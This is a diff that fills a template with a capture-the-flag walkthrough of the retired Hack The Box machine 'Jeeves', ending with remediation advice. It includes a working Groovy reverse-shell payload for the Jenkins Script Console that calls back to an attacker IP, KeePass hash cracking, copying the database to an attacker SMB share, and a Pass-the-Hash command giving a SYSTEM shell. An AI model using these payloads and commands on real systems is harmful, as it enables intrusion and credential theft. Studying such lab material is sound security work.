@@ -1,18 +1,17 @@
-
-| Property         | Value                         |
-| ---------------- | ----------------------------- |
-| **OS**           | Linux / Windows               |
-| **Difficulty**   | Easy / Medium / Hard / Insane |
-| **Release Date** | YYYY-MM-DD                    |
-| **State**        | YYYY-MM-DD                    |
-| **IP**           | 10.10.10.X                    |
-| **Techniques**   | technique-1, technique-2      |
-| **Tags**         | #web #privesc #linux          |
+|Property|Value|
+|---|---|
+|**OS**|Windows|
+|**Difficulty**|Medium|
+|**Release Date**|2017-11-11|
+|**State**|Retired|
+|**IP**|10.129.228.112|
+|**Techniques**|Jenkins Script Console RCE, KeePass hash cracking, NTLM Pass-the-Hash, NTFS Alternate Data Streams|
+|**Tags**|#windows #privesc #jenkins #keepass #ntds|
 
 ---
 ## Summary
 
-Brief 2-3 sentence ogverview of the machine and attack path.
+Jeeves is a medium Windows machine hosting a IIS site on port 80 and a Jetty server on port 50000. Directory brute-forcing on port 50000 discloses `/askjeeves`, a Jenkins CI instance with no authentication configured. Jenkins' built-in **Script Console** allows arbitrary Groovy execution, which is abused to run a reverse-shell payload and obtain a shell as `kohsuke`. A KeePass database (`CEH.kdbx`) is found in the user's `Documents` folder; its master password is cracked offline with `john`, and the opened database discloses a cached NTLM hash for the local `Administrator` account. The recovered hash is used in a Pass-the-Hash attack via `impacket-smbexec` to obtain a `SYSTEM` shell. The root flag itself is hidden inside an NTFS **Alternate Data Stream** attached to a decoy file, requiring a stream-aware read to retrieve.
 
 ---
 ## Enumeration
@@ -20,17 +19,16 @@ Brief 2-3 sentence ogverview of the machine and attack path.
 ### Nmap Scan
 
 ```
-nmap -sC -sV jeeves.htb --open   
+nmap -sC -sV jeeves.htb --open
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-14 15:45 EDT
 Nmap scan report for jeeves.htb (10.129.228.112)
 Host is up (0.036s latency).
 Not shown: 996 filtered tcp ports (no-response)
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
 PORT      STATE SERVICE      VERSION
 80/tcp    open  http         Microsoft IIS httpd 10.0
 |_http-title: Ask Jeeves
 |_http-server-header: Microsoft-IIS/10.0
-| http-methods: 
+| http-methods:
 |_  Potentially risky methods: TRACE
 135/tcp   open  msrpc        Microsoft Windows RPC
 445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
@@ -40,14 +38,14 @@ PORT      STATE SERVICE      VERSION
 Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
-| smb2-security-mode: 
-|   3:1:1: 
+| smb2-security-mode:
+|   3:1:1:
 |_    Message signing enabled but not required
 |_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m59s
-| smb2-time: 
+| smb2-time:
 |   date: 2026-09-15T00:46:12
 |_  start_date: 2026-09-15T00:43:24
-| smb-security-mode: 
+| smb-security-mode:
 |   account_used: guest
 |   authentication_level: user
 |   challenge_response: supported
@@ -57,10 +55,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 52.27 seconds
 ```
 
+Standalone SMB/RPC (135/445) confirm a Windows host that is not domain-joined (`workgroup: WORKGROUP`). Port 50000 runs **Jetty**, a Java servlet container often used to host Jenkins.
+
 ### Directory Enumeration
 
 ```
-gobuster dir -u http://jeeves.htb:50000 -w  /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
+gobuster dir -u http://jeeves.htb:50000 -w /home/kali/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
 
 ===============================================================
 Gobuster v3.8
@@ -81,85 +81,49 @@ Progress: 87662 / 87662 (100.00%)
 ===============================================================
 Finished
 ===============================================================
-
 ```
 
-## Jenkins RCE: 
+`/askjeeves` redirects to `/askjeeves/`, which loads a **Jenkins** dashboard.  The instance has no login/authentication configured and every Jenkins feature, including job creation and the Script Console, is reachable anonymously.
+
+---
+## Foothold
+
+### Jenkins Script Console RCE
 
 ![](./screens/1.png)
 
-### Vulnerability
+#### Vulnerability
 
-- Once access to Jenkins is gained, the Script Console provides a direct path to command execution on the underlying server.
-- The console executes arbitrary Groovy scripts within the Jenkins runtime, functioning similarly to a web shell.
+Jenkins ships with a built-in **Script Console** at `/script`, intended for administrators to run one-off Groovy snippets against the running Jenkins instance for maintenance and debugging. Because Groovy runs on the JVM with full access to Java's standard library, any code submitted there executes with the same OS-level privileges as the Jenkins service itself. When Jenkins is deployed without authentication the console becomes an unauthenticated remote code execution primitive: anyone who can reach `/script` can run arbitrary commands on the host.
 
-### Exploitation
+#### Exploitation
 
-the following powershell payload is written directly into the script console at the /script endpoint, providing a reverse shell:
+A Groovy payload is submitted directly into the console at `http://jeeves.htb:50000/askjeeves/script`, functioning as a reverse shell:
 
-```Groovy
+```groovy
 String host="10.10.15.80"; int port=9001; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
+
+The script is pasted into the "Execute" text box on `/script` and run, causing the process spawned by Jenkins to connect back to a waiting listener.
 
 ---
 ## User Flag
 
 ```
-nc -lvnp 9001                          
+nc -lvnp 9001
 listening on [any] 9001 ...
 connect to [10.10.15.80] from (UNKNOWN) [10.129.228.112] 49676
 Microsoft Windows [Version 10.0.10586]
 (c) 2015 Microsoft Corporation. All rights reserved.
 
-C:\Users\Administrator\.jenkins>whoami 
+C:\Users\Administrator\.jenkins>whoami
 whoami
 jeeves\kohsuke
+```
 
-C:\Users\Administrator\.jenkins>dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is 71A1-6FA1
+A shell is obtained as `kohsuke`, the service account Jenkins runs under. The current working directory (`C:\Users\Administrator\.jenkins`) confirms Jenkins was installed under the `Administrator` profile, though the running account itself is unprivileged.
 
- Directory of C:\Users\Administrator\.jenkins
-
-09/14/2026  08:44 PM    <DIR>          .
-09/14/2026  08:44 PM    <DIR>          ..
-11/08/2017  05:45 PM                48 .owner
-09/14/2026  08:44 PM             1,684 config.xml
-09/14/2026  08:43 PM               156 hudson.model.UpdateCenter.xml
-11/03/2017  10:43 PM               374 hudson.plugins.git.GitTool.xml
-11/03/2017  10:33 PM             1,712 identity.key.enc
-11/03/2017  10:46 PM                94 jenkins.CLI.xml
-09/14/2026  08:46 PM            85,017 jenkins.err.log
-11/03/2017  10:47 PM           360,448 jenkins.exe
-11/03/2017  10:47 PM               331 jenkins.exe.config
-09/14/2026  08:44 PM                 4 jenkins.install.InstallUtil.lastExecVersion
-11/03/2017  10:45 PM                 4 jenkins.install.UpgradeWizard.state
-11/03/2017  10:46 PM               138 jenkins.model.DownloadSettings.xml
-10/25/2022  12:56 PM             3,024 jenkins.out.log
-09/14/2026  08:43 PM                 4 jenkins.pid
-11/03/2017  10:46 PM               169 jenkins.security.QueueItemAuthenticatorConfiguration.xml
-11/03/2017  10:46 PM               162 jenkins.security.UpdateSiteWarningsConfiguration.xml
-11/03/2017  10:47 PM        74,271,222 jenkins.war
-09/14/2026  08:43 PM            38,573 jenkins.wrapper.log
-11/03/2017  10:49 PM             2,881 jenkins.xml
-11/03/2017  10:33 PM    <DIR>          jobs
-11/03/2017  10:33 PM    <DIR>          logs
-09/14/2026  08:44 PM               907 nodeMonitors.xml
-11/03/2017  10:33 PM    <DIR>          nodes
-11/03/2017  10:44 PM    <DIR>          plugins
-11/03/2017  10:47 PM               129 queue.xml.bak
-11/03/2017  10:33 PM                64 secret.key
-11/03/2017  10:33 PM                 0 secret.key.not-so-secret
-12/24/2017  03:47 AM    <DIR>          secrets
-11/08/2017  09:52 AM    <DIR>          updates
-11/03/2017  10:33 PM    <DIR>          userContent
-11/03/2017  10:33 PM    <DIR>          users
-11/03/2017  10:47 PM    <DIR>          war
-11/03/2017  10:43 PM    <DIR>          workflow-libs
-              23 File(s)     74,767,145 bytes
-              12 Dir(s)   2,648,793,088 bytes free
-
+```
 C:\Users\Administrator\.jenkins>dir c:\users
 dir c:\users
  Volume in drive C has no label.
@@ -176,58 +140,48 @@ dir c:\users
                0 File(s)              0 bytes
                6 Dir(s)   2,648,793,088 bytes free
 
-C:\Users\Administrator\.jenkins>dir c:\users\kohsuke\Desktop
-dir c:\users\kohsuke\Desktop
- Volume in drive C has no label.
- Volume Serial Number is 71A1-6FA1
-
- Directory of c:\users\kohsuke\Desktop
-
-11/03/2017  11:19 PM    <DIR>          .
-11/03/2017  11:19 PM    <DIR>          ..
-11/03/2017  11:22 PM                32 user.txt
-               1 File(s)             32 bytes
-               2 Dir(s)   2,648,793,088 bytes free
-
 C:\Users\Administrator\.jenkins>type c:\users\kohsuke\Desktop\user.txt
 type c:\users\kohsuke\Desktop\user.txt
 e3232272596fb47950d59c4cf1e7066a
-
 ```
 
-## Privilege escalation
+---
+## Privilege Escalation
 
-Enumerating kohsuke Documents directory discloses a KeePass password database.
+### Enumeration — Locating the KeePass Database
 
+A filesystem-wide search for `.kdbx` files (the KeePass database extension) turns up a hit in `kohsuke`'s own `Documents` folder:
 
 ```
 C:\Users\Administrator\.jenkins\secrets>dir /s /b C:\*.kdbx 2>nul
 dir /s /b C:\*.kdbx 2>nul
 C:\Users\kohsuke\Documents\CEH.kdbx
-
 ```
 
-The file is copied to the kali host:
+KeePass database files are AES/ChaCha-encrypted containers that store arbitrary credentials (passwords, notes, and even binary attachments like NTLM hashes) behind a single master password. If that master password can be recovered, the whole vault is exposed.
+
+### Exfiltrating and Cracking the Database
+
+The file is copied off the host over an SMB share hosted on the attacking machine:
 
 ```
 C:\Users\kohsuke\Documents>copy CEH.kdbx \\10.10.15.80\share\CEH.kdbx
 copy CEH.kdbx \\10.10.15.80\share\CEH.kdbx
         1 file(s) copied.
-
 ```
 
-Converting the file into a crackable hash:
+`keepass2john` extracts a crackable hash representation of the database's master-password-derived key:
 
 ```
- keepass2john CEH.kdbx
+keepass2john CEH.kdbx
 CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
-                                                                                                                    
-┌──(kali㉿kali)-[~/machines/jeeves]
-└─$ nano CEH.hash
-
 ```
 
-Cracking the hash:
+```
+nano CEH.hash
+```
+
+`john` cracks the hash against `rockyou.txt`:
 
 ```
 john --format=keepass --wordlist=/usr/share/wordlists/rockyou.txt CEH.hash
@@ -238,62 +192,51 @@ Cost 2 (version) is 2 for all loaded hashes
 Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
 Will run 4 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-moonshine1       (CEH)     
+moonshine1       (CEH)
 1g 0:00:00:20 DONE (2026-09-14 16:47) 0.04980g/s 2737p/s 2737c/s 2737C/s nando1..moonshine1
-Use the "--show" option to display all of the cracked passwords reliably
-Session completed. 
-                          
 ```
 
-the master password is now recovered: `moonshine1`
-### Keepass Enumeration
+The master password is recovered: **`moonshine1`**.
+
+### KeePass Enumeration
+
+Opening `CEH.kdbx` with the recovered master password:
 
 ![](./screens/2.png)
 
-Enumerating the database discloses a NT hash, which later is used to provide Administrator access.
+An entry inside the vault discloses a stored NTLM hash for the local `Administrator` account:
 
-`aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00`
-### Exploitation
+```
+aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
+```
 
-```shell
+Since the machine is a standalone (non-domain-joined) host, the local `Administrator` account and its NTLM hash are valid for authentication over SMB directly — no need to crack the hash itself, since NTLM authentication accepts the hash in place of the plaintext password (**Pass-the-Hash**).
+
+### Exploitation — Pass-the-Hash
+
+`impacket-smbexec` is used to obtain a semi-interactive command shell authenticated with the hash alone:
+
+```
 impacket-smbexec -hashes :e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.129.228.112
 
-Impacket v0.14.0.dev0+20251120.95652.9c2d8b61 - Copyright Fortra, LLC and its affiliated companies 
-
-[!] Launching semi-interactive shell - Careful what you execute
-C:\Windows\system32>dir /R C:\Users\Administrator\Desktop\hm.txt
-
- Volume in drive C has no label.
- Volume Serial Number is 71A1-6FA1
-
- Directory of C:\Users\Administrator\Desktop
-
-12/24/2017  03:51 AM                36 hm.txt
-                                    34 hm.txt:root.txt:$DATA
-               1 File(s)             36 bytes
-               0 Dir(s)   2,648,481,792 bytes free
-
-C:\Windows\system32>
-C:\Windows\system32>
-
-```
-
-
-```
-┌──(kali㉿kali)-[~/Downloads]
-└─$ impacket-smbexec -hashes :e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.129.228.112
-
-Impacket v0.14.0.dev0+20251120.95652.9c2d8b61 - Copyright Fortra, LLC and its affiliated companies 
+Impacket v0.14.0.dev0+20251120.95652.9c2d8b61 - Copyright Fortra, LLC and its affiliated companies
 
 [!] Launching semi-interactive shell - Careful what you execute
 C:\Windows\system32>whoami
 nt authority\system
+```
 
-C:\Windows\system32>cd c:\users\administrator\Desktop
-[-] You can't CD under SMBEXEC. Use full paths.
-C:\Windows\system32>type c:\users\administrator\Desktop\root.txt
-The system cannot find the file specified.
+`smbexec` creates and runs a temporary Windows service through SMB/RPC (`svcctl`), so the resulting shell executes as `NT AUTHORITY\SYSTEM` rather than merely as `Administrator`, granting full control of the host.
 
+---
+
+## Root Flag
+
+### Alternate Data Stream Retrieval
+
+The expected root flag location doesn't yield a plain flag:
+
+```
 C:\Windows\system32>dir c:\users\administrator\desktop
  Volume in drive C has no label.
  Volume Serial Number is 71A1-6FA1
@@ -309,24 +252,11 @@ C:\Windows\system32>dir c:\users\administrator\desktop
 
 C:\Windows\system32>type c:\users\administrator\Desktop\hm.txt
 The flag is elsewhere.  Look deeper.
-C:\Windows\system32>dir /s /b C:\root.txt 2>nul
-[-] SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
-                                                                                                                    
-┌──(kali㉿kali)-[~/Downloads]
-└─$ impacket-smbexec -hashes :e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.129.228.112
+```
 
-Impacket v0.14.0.dev0+20251120.95652.9c2d8b61 - Copyright Fortra, LLC and its affiliated companies 
+`hm.txt` is a decoy containing only a taunting message. Requesting the file with `dir /R` (which lists **NTFS Alternate Data Streams**, `ADS`, attached to each file) reveals a second, hidden data stream bound to the same file:
 
-[!] Launching semi-interactive shell - Careful what you execute
-C:\Windows\system32>dir /s /b C:\root.txt 2>nul
-[-] SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
-                                                                                                                    
-┌──(kali㉿kali)-[~/Downloads]
-└─$ impacket-smbexec -hashes :e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.129.228.112
-
-Impacket v0.14.0.dev0+20251120.95652.9c2d8b61 - Copyright Fortra, LLC and its affiliated companies 
-
-[!] Launching semi-interactive shell - Careful what you execute
+```
 C:\Windows\system32>dir /R C:\Users\Administrator\Desktop\hm.txt
 
  Volume in drive C has no label.
@@ -338,43 +268,43 @@ C:\Windows\system32>dir /R C:\Users\Administrator\Desktop\hm.txt
                                     34 hm.txt:root.txt:$DATA
                1 File(s)             36 bytes
                0 Dir(s)   2,648,481,792 bytes free
+```
 
-C:\Windows\system32>
+NTFS's Alternate Data Streams feature allows a single file to carry additional named data streams beyond its default, visible content (`::$DATA`); Windows Explorer, `dir` (without `/R`), and `type` all ignore these by default, making ADS a simple way to hide data in plain sight. Here, a stream literally named `root.txt` is attached to `hm.txt`. Standard tools cannot read it directly:
+
+```
 C:\Windows\system32>type c:\users\administrator\Desktop\hm.txt:root.txt:$DATA
 The filename, directory name, or volume label syntax is incorrect.
 
 C:\Windows\system32>type c:\users\administrator\Desktop\hm.txt:root.txt
 The filename, directory name, or volume label syntax is incorrect.
+```
 
-C:\Windows\system32>more < C:\Users\Administrator\Desktop\hm.txt:root.txt
+`cmd.exe`'s `type` command does not parse the `file:stream` colon syntax over SMB in this context, and `more` hangs waiting on stdin without extracting the content either. PowerShell's `Get-Content`, however, has native, first-class support for named streams via its `-Stream` parameter:
 
-^C[-] Error occurs while reading from remote(104)
-[-] [Errno 32] Broken pipe
-                                                                                                                    
-┌──(kali㉿kali)-[~/Downloads]
-└─$ impacket-smbexec -hashes :e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.129.228.112
-
-Impacket v0.14.0.dev0+20251120.95652.9c2d8b61 - Copyright Fortra, LLC and its affiliated companies 
-
-[!] Launching semi-interactive shell - Careful what you execute
+```
 C:\Windows\system32>powershell -Command "Get-Content C:\Users\Administrator\Desktop\hm.txt -Stream root.txt"
 
 afbc5bd4b615a60648cec41c6ac92530
-
-C:\Windows\system32>
-C:\Windows\system32>
-
 ```
 
 ---
+
 ## Remediation
 
-- Key takeaway 1
-- Key takeaway 2
-- Key takeaway 3
+- **Unauthenticated Jenkins instance:** Never deploy Jenkins without authentication and authorization enabled. Enable Jenkins' built-in security realm (or an external SSO/LDAP provider) and restrict anonymous access to read-only, non-sensitive views at most.
+- **Exposed Script Console:** Restrict access to `/script` to a small set of trusted administrators via Jenkins' role-based authorization strategy. Consider disabling the Script Console entirely in production environments where it is not actively needed.
+- **Plaintext-adjacent credential storage:** A KeePass database containing a privileged NTLM hash was stored, unprotected by disk-level access controls, in a regular user's `Documents` folder. Store credential vaults on encrypted volumes with strict NTFS permissions, and avoid caching domain/local admin secrets in per-user files.
+- **Weak KeePass master password:** `moonshine1` was crackable against a common wordlist in seconds. Enforce long, high-entropy master passwords and consider key-file or hardware-token-based unlocking in addition to a password.
+- **NTLM hash reuse / Pass-the-Hash exposure:** Because NTLM authentication accepts a hash in place of a plaintext password, any disclosed hash for a privileged account is equivalent to full compromise. Disable NTLM where possible in favor of Kerberos, and rotate credentials immediately after any suspected disclosure.
+- **Sensitive data hidden in Alternate Data Streams:** While used here only as a CTF flag-hiding mechanism, ADS can be abused in real environments to hide malicious payloads from casual file listings. Use ADS-aware antivirus/EDR scanning and avoid relying on ADS for genuine secret storage.
 
 ---
+
 ## References
 
-- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
-- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
+- [Jenkins Security Advisory — Script Console](https://www.jenkins.io/doc/book/managing/script-console/)
+- [KeePass — Password Database Format & Security](https://keepass.info/help/base/security.html)
+- [Impacket — smbexec](https://github.com/fortra/impacket)
+- [Microsoft Docs — NTFS Alternate Data Streams](https://learn.microsoft.com/en-us/sysinternals/downloads/streams)
+- [MITRE ATT&CK — T1564.004: Hide Artifacts: NTFS File Attributes](https://attack.mitre.org/techniques/T1564/004/)
